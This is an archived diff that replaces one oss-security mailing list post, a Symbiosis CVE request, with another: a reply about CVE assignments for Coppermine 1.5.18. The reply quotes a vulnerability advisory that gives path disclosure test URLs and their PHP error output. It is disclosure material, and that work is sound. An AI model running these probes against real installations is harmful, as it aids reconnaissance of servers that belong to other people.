@@ -1,49 +1,102 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/05/14/1
-Message-ID: <20120514124113.GA3634@steve.org.uk>
-Date: Mon, 14 May 2012 13:41:13 +0100
-From: Steve Kemp <steve@...ve.org.uk>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/03/2
+Message-ID: <20120403105623.GB2687@kludge.henri.nerv.fi>
+Date: Tue, 3 Apr 2012 13:56:23 +0300
+From: Henri Salo <henri@...v.fi>
 To: oss-security@...ts.openwall.com
-Subject: CVE request: Bytemark Symbiosis
+Subject: Re: CVE-request: Coppermine 1.5.18 waraxe-2012-SA#081
 Content-Type: text/plain; charset=utf-8
 
+On Fri, Mar 30, 2012 at 11:36:23AM -0600, Kurt Seifried wrote:
+> What about the path disclosures?
 
-  Symbiosis is an easy to use collection of tools, utilities,
- and configuration files for mass hosting virtual domains
- using Apache, Exim4, Dovecot, PureFTPD, and several other
- daemons.
+I was not sure if those are really worth of CVE-identifier(s), but please do assign if you think those are needed. I do not see path disclosure issues as important security vulnerabilities especially if there is path disclosure issues in same version that there is other security vulnerabilities.
 
-  The code behind the system is freely available, and it
- is widely used by at least one hosting company.  The code
- itself is available, along with documentation, here:
+If you ask me two 2012 CVE-identifiers are needed. Please correct me in case I am wrong.
 
-    http://symbiosis.bytemark.co.uk/
+1. Stored XSS edit_one_pic.php keywords
+2. Multiple path disclosures in 1.5.18
+2.1. visiblehookpoints plugin index.php
+2.2. thumbnails.php GET parameters "page" and "cat"
+2.3. usermgr.php GET parameter "page"
+2.4. search.inc.php GET parameters "newer_than" and "older_than"
 
-  Unfortunately releases between these two mercurial
- identifiers contained a significant flaw:
+These issues (according to the advisory page) are fixed in: 1.5.20 (I have not tested these). Here is the copypaste from original advisory:
 
-  mercurial ID:   1068
-  date:        Wed Feb 01 11:49:57 2012 +0000
+"""
+###############################################################################
+2. Path Disclosure in "visiblehookpoints" plugin
+###############################################################################
 
-  And
+Test:
 
-  changeset:   1326
-  date:        Thu May 10 08:35:13 2012 +0100
+http://localhost/cpg1518/plugins/visiblehookpoints/index.php
+
+Result:
+
+Warning: require_once(include/init.inc.php) [function.require-once]:
+failed to open stream: No such file or directory in
+C:apache_wwwcpg1518pluginsvisiblehookpointsindex.php on line 22
+
+Fatal error: require_once() [function.require]:
+Failed opening required 'include/init.inc.php' (include_path='.;C:phppear') in
+C:apache_wwwcpg1518pluginsvisiblehookpointsindex.php on line 22
 
 
-  IMAP/POP3/SMTP authentication would accept any password
- for any valid email account.  (Logins are of the form
- $user@...main.)
+###############################################################################
+3. Path Disclosure in "thumbnails.php"
+###############################################################################
 
-  This was fixed with the following commit:
+Attack vector: user submitted GET parameters "page" and "cat"
 
-    https://projects.bytemark.co.uk/projects/symbiosis/repository/diff?rev=1327&rev_to=1322
+Tests:
 
-  Please could a CVE identifier be allocated such that we
- may use it in our documentation.
+http://localhost/cpg1518/thumbnails.php?page[]
+http://localhost/cpg1518/thumbnails.php?cat[]
 
-Steve
--- 
-Debian GNU/Linux System Administration
-http://www.debian-administration.org/
+Results:
 
+Fatal error: Unsupported operand types in
+C:apache_wwwcpg1518includefunctions.inc.php on line 2980
+
+Fatal error: Unsupported operand types in
+C:apache_wwwcpg1518 humbnails.php on line 160
+
+
+
+###############################################################################
+4. Path Disclosure in "usermgr.php"
+###############################################################################
+
+Attack vector: user submitted GET parameter "page"
+Preconditions: admin privileges needed
+
+Test:
+
+http://localhost/cpg1518/usermgr.php?page[]
+
+Result:
+
+Fatal error: Unsupported operand types in
+C:apache_wwwcpg1518usermgr.php on line 185
+
+
+###############################################################################
+5. Path Disclosure in "search.inc.php"
+###############################################################################
+
+Attack vector: user submitted GET parameters "newer_than" and "older_than"
+
+Tests:
+
+http://localhost/cpg1518/thumbnails.php?search=1&album=search&newer_than[]
+http://localhost/cpg1518/thumbnails.php?search=1&album=search&older_than[]
+
+Results:
+
+Fatal error: Unsupported operand types in
+C:apache_wwwcpg1518includesearch.inc.php on line 106
+
+Fatal error: Unsupported operand types in
+C:apache_wwwcpg1518includesearch.inc.php on line 107
+"""
